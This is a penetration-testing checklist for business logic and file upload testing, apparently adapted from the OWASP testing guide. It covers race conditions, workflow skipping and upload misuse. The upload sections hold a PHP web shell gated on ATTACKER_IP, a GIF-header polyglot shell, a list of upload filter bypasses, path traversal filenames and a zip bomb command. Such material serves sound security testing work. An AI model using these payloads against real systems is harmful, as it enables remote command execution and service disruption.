# 4.10 Business Logic Testing (WSTG-BUSL)

Tests for application logic flaws, race conditions, workflow circumvention, and file upload misuse.

---

## WSTG-BUSL-01: Business Logic Data Validation
**Test:** Submit data that is logically valid but violates business rules (negative quantities, impossible dates, non-existent SKUs, prices of $0).

---

## WSTG-BUSL-02: Forge Requests
**Test:** Bypass multi-step processes by jumping directly to later steps; manipulate hidden/predictable values.

---

## WSTG-BUSL-04: Process Timing Attacks
**Test:** Race conditions in:
- Coupon code redemption (apply same code twice simultaneously)
- Funds transfer (negative balance attacks)
- Vote/rating systems (double-vote)
- Flash sale (exceed quantity limits)

**Tool:** Turbo Intruder (Burp), Race Condition tester, parallel requests via threading

---

## WSTG-BUSL-06: Workflow Circumvention
**Test:** Skip steps in checkout/checkout/process flows; start a transaction then jump to a later step without completing required steps.

---

## WSTG-BUSL-08: Unexpected File Upload
**Dangerous Upload Types:** `.jsp`, `.aspx`, `.php`, `.exe`, `.html` (XSS), `.csv` (CSV injection)

**Test Checklist:**
- Client-side only type validation → bypass via proxy
- Content-Type only validation → change header
- Extension only validation → use double extension, null byte
- Path traversal in filename: `../../../../shell.php`
- Check if uploaded file accessible at predictable URL

---

## WSTG-BUSL-09: Malicious File Upload
**Web Shell Examples:**
```php
<?php if($_SERVER['REMOTE_ADDR']==="ATTACKER_IP") { system($_GET['cmd']); } ?>
```

**Filter Bypass Techniques:**
| Technique | Example |
|-----------|---------|
| Extension change | `shell.php5`, `shell.phtml`, `shell.shtml`, `shell.pHp` |
| Double extension | `shell.jpg.php`, `shell.php.jpg` |
| Null byte | `shell.php%00.jpg` |
| Trailing chars | `shell.php...`, `shell.php;jpg` |
| Content-Type spoof | Change to `image/jpeg` |
| Magic bytes | Prepend GIF header: `GIF89a;<?php system($_GET['cmd']); ?>` |
| Nginx alias | Upload `test.jpg`, access `test.jpg/x.php` |
| Case variation | `SHELL.PHP`, `Shell.PhP` |

**Zip Bomb:**
```bash
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```

**Archive Path Traversal:** Upload ZIP containing `..\..\..\..\shell.php`

**Malware Testing:** Use EICAR test file; Metasploit/SET for malicious Office documents
